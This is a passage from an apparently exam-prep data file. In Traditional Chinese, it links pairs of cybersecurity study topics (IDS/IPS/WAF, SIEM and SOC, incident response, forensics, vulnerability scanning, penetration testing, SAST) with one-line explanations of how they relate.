   "why": "CSP 標頭是 XSS 的另一道牆"
  },
  {
   "a": "1.2-08",
   "b": "1.2-03",
   "why": "法規 1 小時通報，與首要遏制要同時進行"
  },
  {
   "a": "1.2-08",
   "b": "1.2-12",
   "why": "通報與通知對象，在 800-61 偵測與分析階段就要決定"
  },
  {
   "a": "1.2-10",
   "b": "1.2-14",
   "why": "差別在：IPS 看網路封包，WAF 看應用層請求內容"
  },
  {
   "a": "1.2-10",
   "b": "1.2-26",
   "why": "蜜罐與 IDS 都在偵測，不是阻止攻擊"
  },
  {
   "a": "1.2-10",
   "b": "2.1-05",
   "why": "IDS／IPS 的告警與日誌要送進 SIEM 關聯"
  },
  {
   "a": "1.2-11",
   "b": "1.2-17",
   "why": "VLAN 是網段切割，微分段是更細的工作負載隔離"
  },
  {
   "a": "1.2-12",
   "b": "2.1-09",
   "why": "事件處理中的證據處理，遵循鑑識保全原則"
  },
  {
   "a": "1.2-14",
   "b": "1.2-23",
   "why": "WAF 可擋 L7 的 HTTP GET 洪水"
  },
  {
   "a": "1.2-15",
   "b": "2.2-05",
   "why": "基線與 GCB 檢查是資安健診的項目"
  },
  {
   "a": "1.2-15",
   "b": "2.1-02",
   "why": "弱掃後依基線與優先序做強化修補"
  },
  {
   "a": "1.2-16",
   "b": "2.2-06",
   "why": "上傳漏洞與 XXE 可在源碼檢測中找出"
  },
  {
   "a": "1.2-17",
   "b": "1.2-18",
   "why": "廠商連線需放在分段後的專用區，並嚴控權限"
  },
  {
   "a": "1.2-18",
   "b": "1.2-20",
   "why": "遠端維護是供應商風險管理的重點環節"
  },
  {
   "a": "1.2-19",
   "b": "2.1-04",
   "why": "威脅情資與 CVE／CVSS 一起決定修補順序"
  },
  {
   "a": "1.2-19",
   "b": "2.1-03",
   "why": "SOC 運作要吃威脅情資，才能偵測新手法"
  },
  {
   "a": "1.2-21",
   "b": "1.2-14",
   "why": "WAF 與 HTTP 標頭是網站強化的兩層防線"
  },
  {
   "a": "1.2-22",
   "b": "1.2-12",
   "why": "AI 事件應變仍走遏制、根除、復原流程"
  },
  {
   "a": "1.2-24",
   "b": "1.1-04",
   "why": "WSL 是 Windows 上另一個可被濫用的執行環境"
  },
  {
   "a": "1.2-24",
   "b": "1.2-15",
   "why": "WSL 也要納入基線與組態強化"
  },
  {
   "a": "1.2-25",
   "b": "1.2-20",
   "why": "雲端容器的映像來源屬供應鏈管理"
  },
  {
   "a": "1.2-25",
   "b": "2.2-04",
   "why": "SCA 與映像掃描，提早發現容器的第三方漏洞"
  },
  {
   "a": "1.2-26",
   "b": "2.1-03",
   "why": "蜜罐告警是 SOC 重要偵測來源"
  },
  {
   "a": "1.2-27",
   "b": "2.1-01",
   "why": "資料外流事件靠日誌判讀還原"
  },
  {
   "a": "2.1-01",
   "b": "2.1-05",
   "why": "日誌是原料，SIEM 是集中與關聯的平台"
  },
  {
   "a": "2.1-01",
   "b": "2.1-06",
   "why": "端點調查要靠日誌時間線拼出事件"
  },
  {
   "a": "2.1-02",
   "b": "2.1-04",
   "why": "差別在：CVSS 是嚴重度，修補優先序還看資產與被利用"
  },
  {
   "a": "2.1-02",
   "b": "2.2-03",
   "why": "差別在：弱掃找已知弱點，滲透驗證能否被實際利用"
  },
  {
   "a": "2.1-02",
   "b": "2.2-07",
   "why": "報告中的弱點要附修補優先序與建議"
  },
  {
   "a": "2.1-03",
   "b": "2.1-05",
   "why": "SOC 的日常就是看 SIEM 告警與 SOAR 自動化"
  },
  {
   "a": "2.1-06",
   "b": "2.1-09",
   "why": "調查中發現的證物，須依鑑識流程保全"
  },
  {
   "a": "2.1-07",
   "b": "2.1-08",
   "why": "信件釣魚連結的後續連線，可由封包分析佐證"
  },
  {
   "a": "2.1-08",
   "b": "2.1-09",
   "why": "封包檔也是證據，要雜湊驗證不被改動"
  },
  {
   "a": "2.2-01",
   "b": "2.2-02",
   "why": "滲透流程各階段，對應 Nmap 等工具使用"
  },
  {
   "a": "2.2-01",
   "b": "2.2-08",
   "why": "滲透第一步是被動偵察與足跡建立"
  },
  {
   "a": "2.2-01",
   "b": "2.2-07",
   "why": "測試完成後要有給管理層與修補人員的報告"
  },
  {
   "a": "2.2-02",
   "b": "2.2-08",
   "why": "Nmap 主動掃描接在 OSINT 被動偵察之後"
  },
  {
   "a": "2.2-02",
   "b": "2.2-09",
   "why": "SQL 注入測試常搭配 sqlmap 等工具"
  },
  {
   "a": "2.2-03",
   "b": "2.2-04",
   "why": "差別在：弱掃與滲透看執行中，SAST／SCA 看原始碼元件"
  },
  {
   "a": "2.2-03",
   "b": "2.2-05",
   "why": "差別在：滲透測單點深度，資安健診是全面普查"
  },
  {
   "a": "2.2-04",
   "b": "2.2-06",
   "why": "SAST 用在看程式碼，要懂判讀才不被誤報誤導"
  },
  {
   "a": "2.2-04",
   "b": "2.2-10",
   "why": "行動 App 的靜態分析、動態分析，對應 SAST 與 DAST 的概念"
  },
  {
   "a": "2.2-08",
   "b": "1.1-09",
   "why": "APT 第一階段情報蒐集，與滲透偵察同一套做法"
  },
  {
   "a": "2.2-10",
   "b": "2.2-06",
   "why": "App 反組譯看到的程式碼，也用源碼檢測思維判讀"
  },
  {
   "a": "2.2-07",
   "b": "2.2-05",
   "why": "健診與測試報告都要提供高階可讀的結論"
  },
  {
   "a": "2.2-09",
   "b": "2.2-06",
   "why": "源碼中的 SQL 拼接與實測結果互相印證"
  }
 ],
 "examTotal": 480
};
